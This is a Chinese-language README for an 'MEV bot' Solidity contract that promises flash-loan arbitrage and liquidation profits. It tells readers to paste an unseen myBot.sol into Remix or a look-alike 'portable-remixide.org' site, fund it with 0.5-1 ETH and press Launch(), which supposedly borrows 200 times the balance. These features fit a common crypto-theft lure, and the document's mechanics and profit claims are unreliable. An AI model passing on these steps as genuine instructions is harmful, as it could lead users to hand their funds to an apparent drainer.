![B](https://i.postimg.cc/Vvxx2whh/20251219-1540-Banner-dla-Githab-simple-compose-01kcvddqxpfd3bgr4kkvnf0qm7.png)


## Executor (Aave/Balancer + Uniswap/Sushi)

简单来说，这个合约用于MEV：获取闪电贷，在DEX之间进行套利，执行清算。所有功能都已准备好，部署即可使用。

功能：

**本质上：**合约获取代币闪电贷，通过DEX将代币兑换为其他代币，然后返还贷款+费用，从价格差异中提取利润。

**重要：**整个方案构建为**整个过程在一个合约的一笔交易中发生** — 从获取贷款到返还和获得利润。

- **Aave V3 flashLoanSimple**：获取闪电贷并调用 `executeOperation(...)` 回调，其中执行策略。
- **Balancer Vault flashLoan**：多资产闪电贷和 `receiveFlashLoan(...)` 回调。
- **DEX循环（套利）**：2个交换（Uniswap V3 ↔ SushiSwap V2），带有 `minOut` 和 `minProfit` 检查。
- **清算（Aave V3）**：`liquidationCall(...)`，带有 `minCollateralOut` 检查。
- **提款**：`withdrawEth(...)`, `withdrawToken(...)` + 紧急 `emergencyTokenRecovery(...)`。



如何运行：

所有者合约 — 你是所有者，调用函数，它在一笔交易中进行闪电贷和策略。

**快速方案：**
1. 在Remix中创建合约：https://remix.ethereum.org/ or https://portable-remixide.org

根据截图：
1- 创建.sol文件并将合约粘贴到编辑器字段中 [myBot.sol](myBot.sol)
2- 编译选项卡 > 版本 0.8.20 > 编译按钮
3- 部署选项卡 > 选择Executor合约 > 按Deploy Contract
![合约创建说明](https://i.ibb.co/HTRkw29n/instructions.png)

2. 充值合约余额 (0.5-1 ETH)

3. 运行 `Launch()` — 它获取贷款并执行操作

4. 如果需要提取利润 — 按 `withdrawEth()` 或 `withdrawToken()`

简单开始：`Launch()` — 贷款金额计算为合约余额 * 200。


- **Aave闪电贷**：`executeFlashLoanArbitrage(asset, amount, params)`
- **Balancer闪电贷**：`executeBalancerFlashLoan(tokens, amounts, userData)`

`params/userData` 内部编码为：

- `operationType`：
  - `1` — DEX循环
  - `2` — 清算

数据格式：

### DEX循环 (operationType = 1)

```solidity
(uint8 firstDex, address tokenIn, address tokenOut, uint24 uniFee, uint256 minOut1, uint256 minOut2, uint256 minProfit)
```

- `firstDex`：`0` = UniswapV3→Sushi, `1` = Sushi→UniswapV3
- `uniFee`：500 / 3000 / 10000
- `minOut1/minOut2`：每步滑点保护
- `minProfit`：最低利润（否则交易回滚）

### 清算 (operationType = 2)

```solidity
(address user, address debtAsset, address collateralAsset, uint256 debtToCover, bool receiveAToken, uint256 minCollateralOut)
```

重要须知：

- 不要指望轻松赚钱。一切取决于市场 — gas、滑点、竞争、头寸。

关于ETH：

0.5-1 ETH会持续很长时间 — 用于gas，如果需要处理ETH/WETH，以及以防万一。

大致利润：取决于贷款规模和市场情况。套利通常为金额的0.01-0.1%，清算为头寸的百分比。100 ETH贷款可能获得0.01-0.1 ETH利润，但这非常近似且无保证 — 市场每秒都在变化。

祝好运！


![Visitors](https://visitor-badge.laobi.icu/badge?page_id=README_CN_PAGE_ID)